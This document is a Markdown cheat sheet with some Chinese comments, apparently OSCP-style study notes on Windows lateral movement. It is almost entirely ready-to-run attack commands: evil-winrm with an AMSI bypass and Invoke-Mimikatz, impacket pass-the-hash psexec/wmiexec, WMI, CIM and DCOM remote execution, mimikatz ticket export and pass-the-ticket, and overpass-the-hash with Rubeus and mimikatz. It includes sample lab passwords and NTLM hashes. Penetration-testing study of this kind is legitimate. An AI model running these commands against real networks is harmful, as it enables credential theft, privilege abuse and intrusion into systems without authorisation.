# Wim & WinRM
### Evil-winRM
```bash
#menu,  -r to use kerberos auth
evil-winrm -i 172.16.245.83 -u wario -p Mushroom!
evil-winrm -i 10.10.147.142 -u 'oscp.exam\celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
# Loading Files -s ps1 scripts; -e binary
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
### Impacket
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
#写法同psexec
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
### Windows
```powershell
#远程创建进程；如果可以，就能看到返回的PID
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

# 1. PScred object
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# Cred + Cim -> CimSession.
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc'; #此处插入payload ---> 使用base64编码的powershell命令

#CimSession Up !
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
   ```
   [[Powershell One Liner]]
```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
winrs -r:files04 -u:jen -p:Nexus123!  "<powershell one liner>"
```

# psexec
### Impacket

```bash
   impacket-psexec -hashes 00000000000000000000000000000000:2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
   ```
***
### Windows
download Link: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
```powershell
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
# Pass the Ticket
### mimikatz
```powershell
sekurlsa::tickets /export #导出票据
dir *.kirbi
mimikatz # kerberos::ptt <ticket_kirbi_file> #注入票据
```
### Rubeus
```powershell
   Rubeus.exe ptt /ticket:<ticket_kirbi_file>
   ```
# DCOM
1. 创建MMC远程对象
2. 使用ExecuteShellCommand方法执行负载
```powershell
# 创建PScredenial对象
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$dcom = 
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("<cmd>",$null,"<args>","7")
# cmd --> powershell args --> <one liner>
```
# OverPass the Hash
将NTLM hash替换为TGT进行Kerberos Auth.
### Impacket
```bash
impacket-getTGT  -dc-ip 10.10.199.146 -hashes :9a3121977ee93af56ebd0ef4f527a35e oscp.exam/Mary.Williams
export KRB5CCNAME=<ccache file FullPath>

impacket-psexec oscp.exam/Mary.Williams@dc01 -k -no-pass
```
### mimikatz
```powershell
#依据NTLM创建tgt; /aes256:/aes128:
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

klist
```
### rubeus
```powershell
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
```